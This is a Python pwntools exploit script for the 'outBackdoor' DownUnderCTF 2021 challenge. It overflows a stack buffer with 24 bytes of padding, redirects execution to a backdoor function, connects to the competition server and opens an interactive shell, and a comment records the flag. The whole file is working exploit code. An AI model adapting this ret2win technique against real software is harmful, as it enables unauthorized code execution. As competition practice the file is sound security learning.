#!/usr/bin/python3
from pwn import *
import os

elf = context.binary = ELF("outBackdoor")
libc = elf.libc
context.log_level = "DEBUG"


backdoor = p64(elf.symbols.outBackdoor+1)
binsh=p64(0x4020ce)
ret= p64(0x401016)
puts = p64(0x401030)
system = p64(elf.symbols.system)
GETS= 0x401060
# main = p64(elf.symbols.main)
# 0x000000000040125b : pop rdi ; ret
# 0x0000000000401259 : pop rsi ; pop r15 ; ret

OFFSET = 24
padd = b'A' * OFFSET



# PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = 0x40125b #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = ret



# main  0x11c9
# 0x1425 cmp     [rbp+var_1C], eax
# 00000000004011D5
gs = '''
break *0x4011D5
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('pwn-2021.duc.tf', 31921)
        # return process(elf.path)
# msf=cyclic_metasploit(50)
# Aa8Aa9Ab 24
# exploit=exploit+b'B'*(len(exploit)-8)+b'C'*8
print(elf.plt)
exploit=padd+backdoor
p=start()
p.sendlineafter('a song?',exploit)
p.interactive()

# 'DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}'